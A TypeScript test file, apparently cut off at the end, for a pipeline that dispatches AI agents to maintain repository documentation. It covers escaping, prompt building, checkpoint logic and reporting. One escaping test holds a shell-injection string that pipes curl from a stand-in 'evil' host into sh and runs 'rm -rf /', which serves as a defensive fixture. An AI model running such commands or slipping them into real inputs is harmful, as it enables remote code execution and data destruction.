import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

import {
  escapeQuotes,
  formatDuration,
  renderProgressBar,
  renderDashboard,
  buildPrompt,
  buildCodeRepoPrompt,
  buildSystemKnowledgePrompt,
  buildInboxCandidatePrompt,
  buildInboxPlaceholders,
  buildPlaceholders,
  renderTemplate,
  isRepoCompleted,
  generateMarkdownReport,
  queryRemoteInboxList,
  runInboxPhase,
  runPipeline,
  type DryRunResult,
  type PipelineSummary,
  type InboxCandidate,
  type InboxCandidateResult,
  type InboxPhaseSummary,
} from "../src/pipeline-core.ts";

test("Pipeline Runner - 安全引号转义", async (t) => {
  await t.test("转义双引号与反斜杠", () => {
    const input = 'fix(order): support "retry" & \\ escape';
    const escaped = escapeQuotes(input);
    assert.equal(escaped, 'fix(order): support \\"retry\\" & \\\\ escape');
  });

  await t.test("转义 $ 与反引号阻断命令注入", () => {
    const input = "fix: pay $(curl http://evil/x | sh) and `rm -rf /` and ${HOME}";
    const escaped = escapeQuotes(input);
    // $ 与反引号前必须带上反斜杠转义，阻断 Shell 展开
    assert.ok(escaped.includes("\\$(curl"));
    assert.ok(escaped.includes("\\`rm"));
    assert.ok(escaped.includes("\\${HOME}"));
    // 确认没有任何未被转义的裸 $ 或反引号
    assert.equal((escaped.match(/(?<!\\)\$/g) || []).length, 0);
    assert.equal((escaped.match(/(?<!\\)`/g) || []).length, 0);
  });

  await t.test("处理空值与非字符串", () => {
    assert.equal(escapeQuotes(null), "");
    assert.equal(escapeQuotes(undefined), "");
    assert.equal(escapeQuotes(12345), "12345");
  });

  await t.test("无引号字符串保持原样", () => {
    assert.equal(escapeQuotes("order-service"), "order-service");
  });
});

test("Pipeline Runner - 模版占位符填充与转义", async (t) => {
  const mockRepoItem = {
    repo: "order-service",
    path: "/srv/workspace/order-service",
    branch: "release",
    status: "changed",
    hasChanges: true,
    from: "1111111111111111111111111111111111111111",
    to: "2222222222222222222222222222222222222222",
    commitCount: 2,
    commits: [
      {
        hash: "2222222222222222222222222222222222222222",
        shortHash: "2222222",
        message: 'fix: handle "null" error',
      },
      {
        hash: "3333333333333333333333333333333333333333",
        shortHash: "3333333",
        message: "feat: add payment retry",
      },
    ],
    changedFilesSummary: {
      summaryText: "3 files changed, 25 insertions(+), 5 deletions(-)",
      filesChanged: 3,
      insertions: 25,
      deletions: 5,
    },
  };

  await t.test("抽取全量十项占位符并校验格式", () => {
    const placeholders = buildPlaceholders(mockRepoItem);
    assert.equal(placeholders.repo, "order-service");
    assert.equal(placeholders.path, "/srv/workspace/order-service");
    assert.equal(placeholders.branch, "release");
    assert.equal(placeholders.from, "1111111111111111111111111111111111111111");
    assert.equal(placeholders.to, "2222222222222222222222222222222222222222");
    assert.equal(placeholders.commitCount, 2);
    assert.equal(placeholders.changedFilesCount, 3);
    assert.equal(placeholders.diffSummary, "3 files changed, 25 insertions(+), 5 deletions(-)");
    assert.ok(placeholders.commitsSummary.includes('2222222 fix: handle "null" error'));
    assert.ok(placeholders.commitsSummary.includes("3333333 feat: add payment retry"));
    assert.ok(placeholders.prompt.includes("order-service"));
    assert.ok(placeholders.prompt.includes("links.verify"));
    assert.ok(placeholders.prompt.includes("maintenance.complete"));
  });

  await t.test("冷启动建库时占位符缺省兜底", () => {
    const initialItem = {
      path: "/srv/workspace/new-service",
      branch: "master",
      status: "initial",
      hasChanges: true,
      from: null,
      to: "aaaaaaa",
      commitCount: 10,
      initialInventoryRequired: true,
    };
    const placeholders = buildPlaceholders(initialItem);
    assert.equal(placeholders.repo, "new-service");
    assert.equal(placeholders.from, "initial");
    assert.equal(placeholders.changedFilesCount, 0);
    assert.equal(placeholders.diffSummary, "0 files changed");
    assert.ok(placeholders.commitsSummary.includes("冷启动建库"));
  });

  await t.test("模版插值替换包含安全引号转义", () => {
    const placeholders = buildPlaceholders(mockRepoItem);
    const template =
      'ad run dispatch --repo="{{repo}}" --to="{{to}}" --commits="{{commitsSummary}}" --prompt="{{prompt}}"';
    const rendered = renderTemplate(template, placeholders, { escapeQuotes: true });

    // 占位符均已替换
    assert.ok(!rendered.includes("{{repo}}"));
    assert.ok(!rendered.includes("{{to}}"));
    assert.ok(!rendered.includes("{{commitsSummary}}"));
    assert.ok(!rendered.includes("{{prompt}}"));

    // 包含的双引号必须被转义为 \"
    assert.ok(rendered.includes('\\"null\\"'));
    // prompt 中涉及的路径引号也必须被安全转义
    assert.ok(rendered.includes('-- path=\\"/srv/workspace/order-service\\"'));
  });

  await t.test("未开启转义时执行原生字符串插值", () => {
    const placeholders = {
      repo: "demo-repo",
      message: 'hello "world"',
    };
    const template = 'echo "{{repo}}: {{message}}"';
    const raw = renderTemplate(template, placeholders, { escapeQuotes: false });
    assert.equal(raw, 'echo "demo-repo: hello "world""');
  });

  await t.test("保留未知占位符", () => {
    const template = "run {{repo}} --unknown={{foo}}";
    const rendered = renderTemplate(template, { repo: "app" });
    assert.equal(rendered, "run app --unknown={{foo}}");
  });
});

test("Pipeline Runner - 内置单仓维护提示词生成 (buildPrompt)", async (t) => {
  const promptData = {
    repo: "order-service",
    path: "/srv/workspace/order-service",
    branch: "release",
    from: "1111111111111111111111111111111111111111",
    to: "2222222222222222222222222222222222222222",
    commitCount: 2,
    changedFilesCount: 3,
    commitsSummary: '2222222 fix: handle "null" error\n3333333 feat: add payment retry',
    diffSummary: "3 files changed, 25 insertions(+), 5 deletions(-)",
  };

  const prompt = buildPrompt(promptData);

  await t.test("验证任务背景与基线包含仓库、路径、分支、检查点与变更统计", () => {
    assert.ok(prompt.includes("order-service"));
    assert.ok(prompt.includes("/srv/workspace/order-service"));
    assert.ok(prompt.includes("release"));
    assert.ok(prompt.includes("1111111111111111111111111111111111111111"));
    assert.ok(prompt.includes("2222222222222222222222222222222222222222"));
    assert.ok(prompt.includes('2222222 fix: handle "null" error'));
    assert.ok(prompt.includes("3 files changed, 25 insertions(+), 5 deletions(-)"));
    assert.ok(prompt.includes("新增提交共 2 个，涉及 3 个文件变动"));
  });

  await t.test("验证包含编排技能规范引用", () => {
    assert.ok(prompt.includes("skills/knowledge-maintenance-orchestrator/SKILL.md"));
    assert.ok(prompt.includes("skills/project-knowledge-maintainer"));
  });

  await t.test("验证包含六大分类落盘规范、命名公式与根目录导航", () => {
    assert.ok(prompt.includes("/srv/workspace/order-service/docs/knowledge/<category>/"));
    assert.ok(prompt.includes("<category>-<topic>.md"));
    assert.ok(prompt.includes("index.md"));
    assert.ok(prompt.includes("overview.md"));
    assert.ok(prompt.includes("flow 类别"));
    assert.ok(prompt.includes("interface 类别"));
    assert.ok(prompt.includes("rule 类别"));
    assert.ok(prompt.includes("module 类别"));
    assert.ok(prompt.includes("data 类别"));
    assert.ok(prompt.includes("runbook 类别"));
  });

  await t.test("验证包含 data 类别红线约束", () => {
    assert.ok(prompt.includes("/srv/workspace/system-knowledge"));
    assert.ok(prompt.includes("db-map.md"));
    assert.ok(prompt.includes("ddl/data-ddl-{schema}.md"));
    assert.ok(prompt.includes("data/data-databases.md"));
    assert.ok(prompt.includes("严禁在代码仓自身文档中复制粘贴表结构或建表脚本"));
  });

  await t.test("验证包含工作区拓扑与绝对路径清单", () => {
    assert.ok(prompt.includes("目标仓库：/srv/workspace/order-service"));
    assert.ok(prompt.includes("兄弟代码仓：/srv/workspace/<sibling-repo>"));
    assert.ok(prompt.includes("系统知识仓：/srv/workspace/system-knowledge"));
    assert.ok(prompt.includes("动作参数统一使用绝对路径"));
  });

  await t.test("验证包含更新门槛与失效四问判定", () => {
    assert.ok(prompt.includes("行为：文档记载的流程、分支、状态、顺序、失败传播是否变化？"));
    assert.ok(prompt.includes("契约：文档记载的接口出入参、事件、队列、配置键语义是否变化？"));
    assert.ok(prompt.includes("定位：文档给出的文件、类、方法是否改名或移动？"));
    assert.ok(prompt.includes("缺失：是否新增了该文档主题内读者需要的事实"));
    assert.ok(prompt.includes("no_change_needed"));
  });

  await t.test("验证包含特权环境与工具自省契约", () => {
    assert.ok(prompt.includes("--profile skm"));
    assert.ok(prompt.includes("ad info"));
    assert.ok(prompt.includes("ad list"));
    assert.ok(prompt.includes("ad describe"));
    assert.ok(prompt.includes("Recommended Input"));
    assert.ok(prompt.includes("Syntax Reference"));
  });

  await t.test("验证包含断链自检与就地修复门禁铁律", () => {
    assert.ok(prompt.includes("workspace/links.verify"));
    assert.ok(prompt.includes("brokenCount > 0"));
    assert.ok(prompt.includes("brokenCount === 0"));
    assert.ok(prompt.includes("files.edit"));
    assert.ok(prompt.includes("git status"));
    assert.ok(prompt.includes("git diff"));
    assert.ok(prompt.includes("git restore ."));
  });

  await t.test("验证包含最终交付与检查点推进绝对标志", () => {
    assert.ok(prompt.includes("maintenance/maintenance.publish"));
    assert.ok(prompt.includes("maintenance/maintenance.complete"));
    assert.ok(prompt.includes("docs_updated"));
    assert.ok(prompt.includes("no_change_needed"));
  });

  await t.test("验证缺省入参时的稳健兜底", () => {
    const minimalPrompt = buildPrompt({});
    assert.ok(minimalPrompt.includes("目标仓库："));
    assert.ok(minimalPrompt.includes("工作区绝对路径：/srv/workspace"));
    assert.ok(minimalPrompt.includes("目标分支：master"));
    assert.ok(minimalPrompt.includes("前置检查点：initial"));
    assert.ok(minimalPrompt.includes("无新增提交"));
    assert.ok(minimalPrompt.includes("无文件变动"));
    assert.ok(minimalPrompt.includes("links.verify"));
    assert.ok(minimalPrompt.includes("maintenance.complete"));
  });

  await t.test("验证提示词遵循 AGENTS.md 规范（无数字序号列表、无表情符号、无粗体嵌套行内代码）", () => {
    // 严禁包含数字列表（1. 2. 3. 等）
    assert.ok(!/^\s*\d+\.\s/m.test(prompt));
    // 严禁包含表情符号
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(prompt));
    // 严禁粗体嵌套行内代码（如 **`...`**）
    assert.ok(!/\*\*[^*]*`[^*]*\*\*/.test(prompt));
  });
});

test("Pipeline Runner - 系统知识库全局维护提示词生成 (buildSystemKnowledgePrompt)", async (t) => {
  const sysPromptData = {
    repo: "system-knowledge",
    path: "/srv/workspace/system-knowledge",
    branch: "master",
    repoType: "system_knowledge" as const,
    from: "1111111111111111111111111111111111111111",
    to: "2222222222222222222222222222222222222222",
    commitCount: 1,
    changedFilesCount: 2,
    commitsSummary: "2222222 docs(system): sync payment domain flow",
    diffSummary: "2 files changed, 10 insertions(+)",
    codePhaseSummary: "前序已完成巡检且发生更新的代码仓（共 1 个）：\n- order-service：已推进检查点至 2222222",
  };

  const prompt = buildSystemKnowledgePrompt(sysPromptData);

  await t.test("验证任务背景包含系统知识仓、路径、分支与前序代码仓巡检摘要", () => {
    assert.ok(prompt.includes("系统知识库全局聚合维护指导"));
    assert.ok(prompt.includes("system-knowledge"));
    assert.ok(prompt.includes("/srv/workspace/system-knowledge"));
    assert.ok(prompt.includes("master"));
    assert.ok(prompt.includes("前序代码仓巡检摘要"));
    assert.ok(prompt.includes("order-service：已推进检查点至 2222222"));
    assert.ok(prompt.includes("2222222 docs(system): sync payment domain flow"));
  });

  await t.test("验证包含系统知识库目录规范与六大分类落盘要求", () => {
    assert.ok(prompt.includes("index.md：系统总索引（业务领域清单 + 代码仓归属对照表）"));
    assert.ok(prompt.includes("db-map.md：全局数据库与业务领域映射表"));
    assert.ok(prompt.includes("ddl/：生产数据库结构快照"));
    assert.ok(prompt.includes("统一六大类别目录：每个业务领域内部必须具备全部六大分类单数目录"));
    assert.ok(prompt.includes("<category>-<topic>.md"));
  });

  await t.test("验证包含新业务领域识别与目录初始化三步法", () => {
    assert.ok(prompt.includes("业务领域识别与目录初始化三步法"));
    assert.ok(prompt.includes("调阅根目录 index.md，获取已登记的业务领域清单与代码仓归属对照表"));
    assert.ok(prompt.includes("扫描工作区（/srv/workspace/*）中所有已纳管代码仓"));
    assert.ok(prompt.includes("开辟全新领域"));
    assert.ok(prompt.includes("一次建齐全部六大分类目录"));
  });

  await t.test("验证包含存量系统知识库有效性与更新判定门禁（失效判定）", () => {
    assert.ok(prompt.includes("存量系统知识库有效性与更新判定门禁（失效判定）"));
    assert.ok(prompt.includes("行为层：跨仓端到端主流程"));
    assert.ok(prompt.includes("契约层：对外 HTTP/RPC 接口、MQ 消息事件"));
    assert.ok(prompt.includes("数据层：是否有数据库表结构变动"));
    assert.ok(prompt.includes("no_change_needed"));
  });

  await t.test("验证包含特权工具、断链自检门禁与 master 分支发布推进", () => {
    assert.ok(prompt.includes("ad run workspace/links.verify --profile skm"));
    assert.ok(prompt.includes("ad run maintenance/maintenance.publish --profile skm -- path=\"/srv/workspace/system-knowledge\" repoType=\"system_knowledge\""));
    assert.ok(prompt.includes("ad run maintenance/maintenance.complete --profile skm -- path=\"/srv/workspace/system-knowledge\""));
    assert.ok(prompt.includes("publish 出参返回的 commit 哈希（或当前 HEAD）传入 commit 参数"));
    assert.ok(prompt.includes("commit=\"<publish出参commit哈希或当前HEAD>\""));
    assert.ok(prompt.includes("未产生新提交时沿用目标检查点"));
  });

  await t.test("验证包含多子代理协同架构与主智能体统筹定位", () => {
    assert.ok(prompt.includes("主智能体角色定位：作为系统层知识维护总控中枢，主智能体负责统筹决策、自主规划、子代理调度委派与最终门禁验收，绝不亲自盲目编辑文件"));
    assert.ok(prompt.includes("跨仓契约与领域影响分析子代理"));
    assert.ok(prompt.includes("新领域初始化子代理"));
    assert.ok(prompt.includes("跨仓主流程子代理"));
    assert.ok(prompt.includes("接口与数据模型子代理"));
    assert.ok(prompt.includes("references/system-knowledge-workflow.md"));
  });

  await t.test("验证包含自动化调查依据提取与三路决策树判定", () => {
    assert.ok(prompt.includes("自动化事实证据提取：委派跨仓契约与领域影响分析子代理，横向扫描工作区兄弟仓（/srv/workspace/*）提取证据，杜绝凭空臆测"));
    assert.ok(prompt.includes("Controller、路由定义、RPC 契约与对外暴露服务"));
    assert.ok(prompt.includes("MQ 主题生产者与消费者、消息载荷与队列绑定"));
    assert.ok(prompt.includes("Flyway 迁移脚本、DDL 变更与持久化实体模型"));
    assert.ok(prompt.includes("路径一（开辟新领域）"));
    assert.ok(prompt.includes("路径二（更新已有领域）"));
    assert.ok(prompt.includes("路径三（无需更新 - 高门槛严格兜底）"));
  });

  await t.test("验证包含全自动自闭环执行铁律与全景主动探索前置门禁", () => {
    assert.ok(prompt.includes("全自动自闭环执行铁律（严禁中断流水线）"));
    assert.ok(prompt.includes("严禁在终端向用户提问、索求确认或等待输入"));
    assert.ok(prompt.includes("全景资产反查与主动探索门禁（防偷懒铁律）"));
    assert.ok(prompt.includes("严禁仅凭增量提交未触碰业务源码（例如仅升级依赖或修改构建配置）便草率判定为无需更新"));
    assert.ok(prompt.includes("自主方案规划（直接闭环，不挂起终端）"));
    assert.ok(!prompt.includes("终端人机讨论：等待用户明确确认或调整输入"));
    assert.ok(!prompt.includes("待确认事项"));
  });

  await t.test("验证包含专业分工受控写入与零断链验收推进闭环", () => {
    assert.ok(prompt.includes("第二阶段：受控写入与专业子代理委派"));
    assert.ok(prompt.includes("开辟新领域场景：委派新领域初始化子代理"));
    assert.ok(prompt.includes("跨仓主流程编排场景：委派跨仓主流程子代理"));
    assert.ok(prompt.includes("契约与模型同步场景：委派接口与数据模型子代理"));
    assert.ok(prompt.includes("第三阶段：零断链验收与推进检查点水位"));
  });

  await t.test("验证提示词遵循 AGENTS.md 规范（无数字序号列表、无表情符号、无粗体嵌套行内代码）", () => {
    assert.ok(!/^\s*\d+\.\s/m.test(prompt));
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(prompt));
    assert.ok(!/\*\*[^*]*`[^*]*\*\*/.test(prompt));
  });

  await t.test("验证通过 buildPrompt 传入 repoType: 'system_knowledge' 自动分流到系统知识库提示词", () => {
    const routedPrompt = buildPrompt({
      repo: "system-knowledge",
      repoType: "system_knowledge",
    });
    assert.ok(routedPrompt.includes("系统知识库全局聚合维护指导"));
    assert.ok(routedPrompt.includes("业务领域识别与目录初始化三步法"));
  });

  await t.test("验证 buildPlaceholders 自动识别 system-knowledge 仓库类型", () => {
    const placeholders = buildPlaceholders({
      repo: "system-knowledge",
      path: "/srv/workspace/system-knowledge",
    });
    assert.equal(placeholders.repoType, "system_knowledge");
    assert.ok(placeholders.prompt.includes("系统知识库全局聚合维护指导"));
  });
});

test("Pipeline Runner - 单仓检查点推进判定", async (t) => {
  const targetCommit = "2222222222222222222222222222222222222222";

  await t.test("检查点完全对齐目标提交时判定完成", () => {
    const status = {
      from: "2222222222222222222222222222222222222222",
      to: "2222222222222222222222222222222222222222",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);
  });

  await t.test("检查点短哈希前缀匹配时判定完成", () => {
    const status = {
      from: "2222222",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);

    const longStatus = {
      from: targetCommit,
    };
    assert.equal(isRepoCompleted(longStatus, "2222222"), true);
  });

  await t.test("状态为 upToDate 时判定完成", () => {
    const status = {
      status: "upToDate",
      from: "1111111",
      to: "2222222222222222222222222222222222222222",
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);
  });

  await t.test("基于 dispatchedAt 与 checkpointUpdatedAt 判定推进状态", () => {
    const dispatchedAt = 100000;
    // 更新时间在派发时间之后 -> 已完成推进
    const statusUpdated = {
      checkpointUpdatedAt: new Date(105000).toISOString(),
      from: "old-commit",
      to: "new-commit",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(statusUpdated, "new-commit", { dispatchedAt }), true);

    // 更新时间在派发时间之前 -> 尚未完成推进
    const statusNotYet = {
      checkpointUpdatedAt: new Date(95000).toISOString(),
      from: "old-commit",
      to: "new-commit",
      hasChanges: true,
    };
    assert.equal(isRepoCompleted(statusNotYet, "new-commit", { dispatchedAt }), false);

    // 历史 commit 与 targetCommit 恰好相同但推进时间早于派发时间 -> 防止提前错误放行
    const statusHistoricalSame = {
      checkpointUpdatedAt: new Date(95000).toISOString(),
      from: "target-commit",
      to: "target-commit",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(statusHistoricalSame, "target-commit", { dispatchedAt }), false);

    // 系统知识仓发布新 commit 后当前 from 与旧 targetCommit 脱节，但已在派发后完成推进 -> 准确判定为完成
    const statusNewCommitPublished = {
      checkpointUpdatedAt: new Date(105000).toISOString(),
      from: "brand-new-published-commit",
      to: "brand-new-published-commit",
      hasChanges: false,
      status: "upToDate",
    };
    assert.equal(isRepoCompleted(statusNewCommitPublished, "pre-dispatch-target-commit", { dispatchedAt }), true);

    // 派发后完成推进且标记为 no_change_needed -> 准确判定为完成
    const statusNoChangeNeeded = {
      checkpointUpdatedAt: new Date(105000).toISOString(),
      from: "pre-dispatch-target-commit",
      to: "pre-dispatch-target-commit",
      actionTaken: "no_change_needed",
      hasChanges: false,
      status: "upToDate",
    };
    assert.equal(isRepoCompleted(statusNoChangeNeeded, "pre-dispatch-target-commit", { dispatchedAt }), true);

    // 错误状态即便更新时间在派发之后也判定未完成
    const statusError = {
      checkpointUpdatedAt: new Date(105000).toISOString(),
      from: "brand-new-published-commit",
      status: "error",
      message: "Git push failed",
    };
    assert.equal(isRepoCompleted(statusError, "pre-dispatch-target-commit", { dispatchedAt }), false);
  });

  await t.test("hasChanges 为 false 且非 error 状态判定完成", () => {
    const status = {
      status: "ok",
      hasChanges: false,
    };
    assert.equal(isRepoCompleted(status, targetCommit), true);
  });

  await t.test("支持解包 ActionDock 信封格式数据", () => {
    const envelope = {
      ok: true,
      data: {
        from: targetCommit,
        hasChanges: false,
      },
    };
    assert.equal(isRepoCompleted(envelope, targetCommit), true);
  });

  await t.test("仍有未处理变更且检查点未更新时判定未完成", () => {
    const status = {
      status: "changed",
      from: "1111111111111111111111111111111111111111",
      to: targetCommit,
      hasChanges: true,
    };
    assert.equal(isRepoCompleted(status, targetCommit), false);
  });

  await t.test("错误状态判定未完成", () => {
    const status = {
      status: "error",
      hasChanges: false,
      message: "Git error",
    };
    assert.equal(isRepoCompleted(status, targetCommit), false);
  });
});

test("Pipeline Runner - 看板与报告格式化", async (t) => {
  await t.test("耗时格式化准确", () => {
    assert.equal(formatDuration(0), "00:00");
    assert.equal(formatDuration(5000), "00:05");
    assert.equal(formatDuration(65000), "01:05");
    assert.equal(formatDuration(3600000), "60:00");
  });

  await t.test("进度条计算准确", () => {
    assert.ok(renderProgressBar(0, 10).includes("0%"));
    assert.ok(renderProgressBar(5, 10).includes("50%"));
    assert.ok(renderProgressBar(10, 10).includes("100%"));
  });

  await t.test("终端实时看板信息完整且无表情符号", () => {
    const dashboard = renderDashboard({
      total: 10,
      processed: 4,
      skipped: 2,
      completed: 2,
      failed: 0,
      activeRepo: "order-service",
      activeRepoElapsed: 30000,
      totalElapsed: 90000,
    });
    assert.ok(dashboard.includes("总仓数: 10"));
    assert.ok(dashboard.includes("已跳过: 2"));
    assert.ok(dashboard.includes("已完成: 2"));
    assert.ok(dashboard.includes("失败: 0"));
    assert.ok(dashboard.includes("当前活跃仓: order-service"));
    // 严禁包含表情符号
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(dashboard));
  });

  await t.test("生成 Markdown 报告符合 AGENTS.md 规范", () => {
    const report = generateMarkdownReport({
      profile: "skm",
      total: 3,
      completed: 1,
      skipped: 1,
      failed: 1,
      totalElapsedMs: 120000,
      results: [
        {
          repo: "up-to-date-repo",
          path: "/srv/workspace/up-to-date-repo",
          repoType: "code",
          status: "skipped",
          durationMs: 0,
          message: "远端检查点已对齐",
        },
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "completed",
          targetCommit: "2222222",
          durationMs: 60000,
          message: "检查点已成功推进至 2222222",
        },
        {
          repo: "payment-service",
          path: "/srv/workspace/payment-service",
          repoType: "code",
          status: "failed",
          targetCommit: "3333333",
          durationMs: 60000,
          message: "等待检查点推进超时 (1 分钟)",
        },
      ],
    });

    // 严禁包含数字列表（1. 2. 3.）
    assert.ok(!/^\d+\.\s/m.test(report));
    // 严禁包含表情符号
    assert.ok(!/[\u{1F300}-\u{1F9FF}]/u.test(report));
    // 排版采用无序列表符号
    assert.ok(report.includes("- 扫描总仓库数：3"));
    assert.ok(report.includes("- 维护成功数：1"));
    assert.ok(report.includes("- 跳过无需更新数：1"));
    assert.ok(report.includes("- 失败或超时数：1"));
    assert.ok(report.includes("- 仓库标识：order-service"));
  });
});

test("Pipeline Runner - 流程调度与观测闭环（模拟执行）", async (t) => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "pipeline-test-"));
  const reportPath = path.join(tmpDir, "report.md");

  const mockScanData = {
    batch: true,
    results: [
      {
        repo: "clean-service",
        path: "/srv/workspace/clean-service",
        branch: "release",
        status: "upToDate",
        hasChanges: false,
        from: "0000000",
        to: "0000000",
      },
      {
        repo: "changed-service",
        path: "/srv/workspace/changed-service",
        branch: "release",
        status: "changed",
        hasChanges: true,
        from: "1111111",
        to: "2222222",
        commitCount: 1,
        commits: [{ hash: "2222222", shortHash: "2222222", message: "feat: update" }],
      },
      {
        repo: "timeout-service",
        path: "/srv/workspace/timeout-service",
        branch: "release",
        status: "changed",
        hasChanges: true,
        from: "3333333",
        to: "4444444",
        commitCount: 1,
        commits: [{ hash: "4444444", shortHash: "4444444", message: "feat: timeout" }],
      },
    ],
  };

  await t.test("预演模式：只打印不触发派发与轮询", async () => {
    const dispatched: string[] = [];
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        dispatchCmd: "ad run my-agent --repo {{repo}}",
      },
      {
        execFn,
        dispatchFn: async (cmd: string) => dispatched.push(cmd),
      }
    )) as DryRunResult;

    assert.equal(result.dryRun, true);
    assert.equal(result.total, 3);
    assert.equal(result.skipped, 1);
    assert.equal(result.pending, 2);
    assert.equal(dispatched.length, 0); // 绝对不触发实际派发
    assert.equal(result.dryRunOutput.length, 2);
    assert.equal(result.dryRunOutput[0].repo, "changed-service");
    assert.equal(result.dryRunOutput[0].renderedCommand, "ad run my-agent --repo changed-service");
  });

  await t.test("--only 过滤仓库", async () => {
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        only: "changed-service",
      },
      { execFn }
    )) as DryRunResult;

    assert.equal(result.total, 1);
    assert.equal(result.pending, 1);
    assert.equal(result.dryRunOutput[0].repo, "changed-service");
  });

  await t.test("扫描状态为 error 的仓库计为失败而非跳过", async () => {
    const scanWithError = {
      batch: true,
      results: [
        {
          repo: "broken-service",
          path: "/srv/workspace/broken-service",
          status: "error",
          hasChanges: false,
          message: "Git error: fatal: not a git repository",
        },
        {
          repo: "clean-service",
          path: "/srv/workspace/clean-service",
          status: "upToDate",
          hasChanges: false,
        },
      ],
    };
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: scanWithError }),
      stderr: "",
    });

    const result = (await runPipeline(
      { profile: "skm", dryRun: true },
      { execFn }
    )) as DryRunResult;

    assert.equal(result.skipped, 1);
    assert.equal(result.pending, 0);
    // error 条目不应出现在待派发清单中，也不应被伪装成 skipped
  });

  await t.test("非预演模式未传 --dispatch-cmd 时抛出异常", async () => {
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    await assert.rejects(
      async () => {
        await runPipeline(
          {
            profile: "skm",
            dryRun: false,
            dispatchCmd: "",
          },
          { execFn }
        );
      },
      {
        message: /缺少必需参数：--dispatch-cmd/,
      }
    );
  });

  await t.test("成功闭环与超时分支覆盖", async () => {
    const dispatchedCmds: string[] = [];
    let pollCountChanged = 0;
    // 虚拟时钟：避免真实时序受并行测试负载影响导致超时误判
    let virtualNow = 0;
    const nowFn = () => virtualNow;
    const sleepFn = async (ms: number) => {
      virtualNow += ms;
    };

    const execFn = async (cmd: string) => {
      // 首次全量扫描
      if (cmd.includes("maintenance.list") && !cmd.includes("-- path=")) {
        return {
          stdout: JSON.stringify({ ok: true, data: mockScanData }),
          stderr: "",
        };
      }

      // 针对 changed-service 的轮询：第 2 次返回推进到 2222222
      if (cmd.includes("changed-service")) {
        pollCountChanged++;
        if (pollCountChanged >= 2) {
          return {
            stdout: JSON.stringify({
              ok: true,
              data: {
                repo: "changed-service",
                from: "2222222",
                to: "2222222",
                hasChanges: false,
                status: "upToDate",
              },
            }),
            stderr: "",
          };
        }
        return {
          stdout: JSON.stringify({
            ok: true,
            data: {
              repo: "changed-service",
              from: "1111111",
              to: "2222222",
              hasChanges: true,
              status: "changed",
            },
          }),
          stderr: "",
        };
      }

      // 针对 timeout-service 的轮询：始终不推进
      if (cmd.includes("timeout-service")) {
        return {
          stdout: JSON.stringify({
            ok: true,
            data: {
              repo: "timeout-service",
              from: "3333333",
              to: "4444444",
              hasChanges: true,
              status: "changed",
            },
          }),
          stderr: "",
        };
      }

      return { stdout: "{}", stderr: "" };
    };

    const progressUpdates: any[] = [];

    const result = (await runPipeline(
      {
        profile: "skm",
        dispatchCmd: "dispatch --repo {{repo}}",
        timeout: 0.001, // 约 60ms 超时，用于单元测试
        interval: 0.001,
        reportFile: reportPath,
        dryRun: false,
      },
      {
        execFn,
        dispatchFn: async (cmd: string) => {
          dispatchedCmds.push(cmd);
        },
        sleepFn,
        nowFn,
        onProgress: (p: any) => progressUpdates.push(p),
      }
    )) as PipelineSummary;

    assert.equal(result.total, 3);
    assert.equal(result.skipped, 1);
    assert.equal(result.completed, 1);
    assert.equal(result.failed, 1);
    assert.equal(dispatchedCmds.length, 2);
    assert.equal(dispatchedCmds[0], "dispatch --repo changed-service");
    assert.equal(dispatchedCmds[1], "dispatch --repo timeout-service");

    // 检查点闭环与超时记录
    const changedRes = result.results.find((r: any) => r.repo === "changed-service");
    assert.equal(changedRes?.status, "completed");
    assert.ok(changedRes?.message?.includes("成功推进"));

    const timeoutRes = result.results.find((r: any) => r.repo === "timeout-service");
    assert.equal(timeoutRes?.status, "failed");
    assert.ok(timeoutRes?.message?.includes("超时"));

    // 校验结算 Markdown 报告落地
    assert.ok(fs.existsSync(reportPath));
    const savedReport = fs.readFileSync(reportPath, "utf8");
    assert.ok(savedReport.includes("# 知识维护流水线执行报告"));
    assert.ok(savedReport.includes("changed-service"));
    assert.ok(savedReport.includes("成功闭环"));
    assert.ok(savedReport.includes("timeout-service"));
    assert.ok(savedReport.includes("执行失败"));

    // 清理临时文件
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });
});

test("Pipeline Runner - 两阶段调度（单仓巡检与系统知识库全局聚合）", async (t) => {
  await t.test("确保两阶段执行顺序：代码仓在前，系统知识仓在后", async () => {
    const mockScanData = {
      batch: true,
      results: [
        {
          repo: "system-knowledge",
          path: "/srv/workspace/system-knowledge",
          repoType: "system_knowledge",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
        },
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "changed",
          hasChanges: true,
          from: "333",
          to: "444",
        },
      ],
    };

    const dispatched: string[] = [];
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        dispatchCmd: "dispatch --repo {{repo}}",
      },
      { execFn }
    )) as DryRunResult;

    assert.equal(result.dryRun, true);
    assert.equal(result.total, 2);
    // 验证无论输入顺序如何，order-service (code) 始终排在前面，system-knowledge 排在后面
    assert.equal(result.dryRunOutput[0]?.repo, "order-service");
    assert.equal(result.dryRunOutput[1]?.repo, "system-knowledge");
  });

  await t.test("前序代码仓更新触发系统知识仓第二阶段调度并注入巡检摘要", async () => {
    let mockTime = 1000;
    const nowFn = () => mockTime;
